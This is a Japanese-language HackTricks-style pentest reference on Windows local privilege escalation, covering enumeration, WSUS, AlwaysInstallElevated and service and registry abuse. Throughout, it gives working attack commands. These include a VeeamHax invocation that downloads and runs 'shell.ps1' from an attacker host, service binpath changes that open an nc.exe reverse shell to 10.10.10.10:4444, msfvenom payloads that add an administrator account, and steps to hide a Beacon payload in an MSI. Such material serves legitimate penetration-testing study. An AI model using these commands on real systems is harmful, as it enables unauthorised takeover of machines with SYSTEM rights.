# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基本理論

### Access Tokens

**Windows Access Tokens について知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels について知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**system の enumerate を妨げたり**、実行ファイルの実行を妨げたり、さらには**活動を検知したり**する可能性のあるさまざまな要素があります。privilege escalation の enumerate を開始する前に、以下の**ページを読み**、これらすべての**防御** **mechanisms**を**enumerate**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` を通じて起動された UIAccess processes は、AppInfo secure-path checks が bypass された場合、prompt なしで High IL に到達するために abuse できます。専用の UIAccess/Admin Protection bypass workflow は以下を確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write（RegPwn）に abuse できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、privileged local NTLM authentication が再利用された SMB TCP connection を介して reflected される、**SMB arbitrary-port** LPE path も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability が存在するか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョン Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft の security vulnerabilities に関する詳細情報を検索するのに便利です。この database には 4,700 件を超える security vulnerabilities が登録されており、Windows environment が示す **massive attack surface** がわかります。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits の Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に credential や Juicy な情報が保存されていませんか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShellの履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcriptファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で、これを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部などが含まれます。ただし、実行の詳細や出力結果が完全には記録されない場合があります。

有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell logs から最後の 15 件のイベントを表示するには、次を実行します。
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全内容の記録が取得され、実行時にコードのすべてのブロックが記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、forensicsやmalicious behaviorの分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細なinsightsが提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
直近の20件のイベントを表示するには、次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http ではなく http**S** を使用して要求されていない場合、システムを侵害できる可能性があります。

まず、cmd で以下を実行して、ネットワークが非 SSL の WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell では以下のようにします：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合、

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

これらの脆弱性をexploitするには、次のようなツールを使用できます。[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) - これらは、SSLで保護されていないWSUSトラフィックに「fake」な更新をinjectする、weaponizedなMiTM exploit scriptです。

調査結果はこちらを参照してください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、これはこのbugがexploitするflawです。

> ローカルユーザーのproxyをmodifyする権限があり、Windows UpdatesがInternet Explorerのsettingsで設定されたproxyを使用している場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自身のトラフィックをinterceptし、asset上でelevated userとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userのsettingsを使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateをgenerateし、このcertificateをcurrent userのcertificate storeに追加すると、HTTPおよびHTTPSのWSUSトラフィックをinterceptできるようになります。WSUSは、certificateに対するtrust-on-first-use型のvalidationを実装するためのHSTSのようなmechanismを使用していません。提示されたcertificateがuserによってtrustedされ、正しいhostnameを持っていれば、serviceによってacceptされます。

このvulnerabilityは、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool（liberatedされた後）を使用してexploitできます。

## Third-Party Auto-UpdatersとAgent IPC (local privesc)

多くのenterprise agentは、localhost IPC surfaceとprivileged update channelを公開しています。enrollmentをattacker serverへcoerceでき、updaterがrogue root CAまたはweak signer checksをtrustする場合、local userはmalicious MSIをdeliverし、SYSTEM serviceにinstallさせることができます。Netskope stAgentSvc chain（CVE-2025-0309）をベースにしたgeneralized techniqueはこちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401経由のSYSTEM)

Veeam B&R < `11.0.1.1261` は、**TCP/9401** 上でlocalhost serviceを公開しており、attacker-controlled messageをprocessすることで、**NT AUTHORITY\SYSTEM**として任意のcommandを実行できます。

- **Recon**: listenerとversionを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 必要なVeeam DLLとともにPoC（`VeeamHax.exe`など）を同じdirectoryに配置し、local socket経由でSYSTEM payloadをtriggerします。
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
このサービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下にある Windows **domain** 環境では、**local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、そしてユーザーが domain 内でコンピューターを作成できることが含まれます。重要なのは、これらの**要件**が**デフォルト設定**で満たされることです。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) に **exploit** があります。

attack のフローの詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。

## AlwaysInstallElevated

この 2 つの**レジストリ**が**有効**（値が **0x1**）になっている**場合**、任意の権限レベルのユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter sessionがある場合は、module **`exploit/windows/local/always_install_elevated`** を使用してこの technique を自動化できます。

### PowerUP

power-upの`Write-UserAddMSI` commandを使用すると、privilege escalation用のWindows MSI binaryをcurrent directory内に作成できます。このscriptは、user/group additionを促すprecompiled MSI installerを書き出します（そのため、GUI accessが必要です）。
```
Write-UserAddMSI
```
作成した binary を実行するだけで privileges を escalate できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を読んでください。**execute** **command lines** だけが目的の場合は、"**.bat**" file を wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit を使用して、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **Generate** する
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力する。**Setup Wizard** project を選択し、**Next** をクリックする。
- project に **AlwaysPrivesc** などの名前を付け、location に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックする。
- 手順 3/4（include する files の選択）に到達するまで **Next** をクリックし続ける。**Add** をクリックして、先ほど Generate した Beacon payload を選択する。その後、**Finish** をクリックする。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更する。
- **Author** や **Manufacturer** など、installed app をより legitimate に見せるために変更できる properties もあります。
- project を右クリックし、**View > Custom Actions** を選択する。
- **Install** を右クリックし、**Add Custom Action** を選択する。
- **Application Folder** を double-click し、**beacon.exe** file を選択して **OK** をクリックする。これにより、installer の実行直後に Beacon payload が execute されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更する。
- 最後に、**build** する。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform を x64 に設定したことを確認する。

### MSI Installation

malicious `.msi` file の **installation** を **background** で execute するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を exploit するには、以下を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と Detectors

### Audit Settings

これらの設定によって、何が**ログ記録されるか**が決まるため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingは、ログがどこに送信されるかを把握するうえで興味深いものです。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的として設計されており、ドメインに参加しているコンピューターごとにパスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル admin パスワードを表示できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードが LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによるメモリの**読み取り**やコードの注入を**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン認証情報**は **Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントで利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン認証情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに、興味深い権限があるか確認します
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格する方法については、こちらを参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**とは何かを**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
**興味深いtoken**と、それらを悪用する方法については、次のページを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示する際に、**プロセスのコマンドライン内にパスワードがないか確認します**。\
**実行中のバイナリを上書きできるか**、または、悪用可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を仕掛けるために、バイナリのフォルダーへの書き込み権限があるかを確認します：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に、実行中の [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。権限昇格に悪用できる可能性があります。

**プロセスのバイナリに対する権限の確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが存在するフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリ上のPassword mining

sysinternalsの**procdump**を使用して、実行中のプロセスのメモリダンプを作成できます。FTPなどのサービスは、メモリ上に**credentialsをclear text**で保持しているため、メモリをダンプしてcredentialsを読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows Help and Support」（Windows + F1）で、「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

## Services

Service Triggers により、特定の条件（named pipe/RPC endpoint のアクティビティ、ETW events、IP availability、device arrival、GPO refresh など）が発生したときに、Windows はサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発火させることで、privileged services を起動できる場合があります。enumeration および activation techniques については、こちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービス一覧を取得するには:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ の **accesschk** バイナリを用意することを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がいずれかのサービスを変更できるか確認することを推奨します。
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeはこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（例：SSDPSRVで）次のエラーが発生した場合：

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。サービスが無効になっているか、関連付けられた有効なデバイスがないことが原因です。_

次のコマンドを使用して有効にできます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**（XP SP1では）upnphost サービスが動作するために SSDPSRV に依存していることを考慮してください**

**この問題のもう一つの回避策**は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、以下のさまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再設定を可能にします。
- **WRITE_DAC**: 権限の再設定を可能にし、service configuration の変更につながります。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を可能にします。
- **GENERIC_WRITE**: service configuration を変更する権限を継承します。
- **GENERIC_ALL**: service configuration を変更する権限も継承します。

この脆弱性の検出と exploit には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの弱い権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権付きの domain account として実行されているが、**低権限ユーザーがサービス EXE またはその親フォルダーを変更できる場合**、**binary を置き換えてサービスを再起動することで**サービスを hijack できることがあります。

**サービスによって実行される binary を変更できるか**、または binary が配置されている**フォルダーに対する write permissions があるか**を確認します（[**DLL Hijacking**](dll-hijacking/index.html)**。**\
**wmic**（system32 にはありません）を使用してサービスによって実行されるすべての binary を取得し、**icacls** を使用して権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** も使用できます:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイル自体、またはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実際に悪用する流れは次のとおりです。

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

自動チェックに役立つもの：
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常のユーザーによる再起動を許可していない場合は、boot 時に自動的に起動するか、再起動させる failure action が設定されているか、またはそのサービスを使用する application によって間接的に起動できるかを確認してください。

### Services registry modify permissions

任意のサービス registry を変更できるか確認してください。\
以下を実行して、サービス registry に対する **permissions** を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を保有しているか確認する必要があります。保有している場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成します。これらのキーは後で **SYSTEM** プロセスによって HKLM の session key にコピーされます。Registry **symbolic link race** によって、この特権書き込みを **任意の HKLM path** にリダイレクトし、任意の HKLM **value write** primitive を取得できます。

主な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの Accessibility 機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御可能な configuration が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop transitions 中に作成され、ユーザーによる書き込みが可能です。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を設定します。
2. **LockWorkstation** などを使用して secure-desktop copy をトリガーし、AT broker flow を開始します。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race** に勝ちます。oplock が発生したら、**HKLM Session ATConfig** key を、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が攻撃者の選択した value を、リダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を取得したら、service configuration values を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常のユーザーが start できる service（例: **`msiserver`**）を選び、書き込み後にトリガーします。**注:** public exploit implementation は race の一部として workstation を **locks** します。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分です**。


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでの各部分を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないすべてのサービスパスを一覧表示します：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit **で検出および悪用できます**: `exploit/windows/local/trusted\_service\_path` metasploit **を使用してサービスバイナリを手動で作成できます**:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

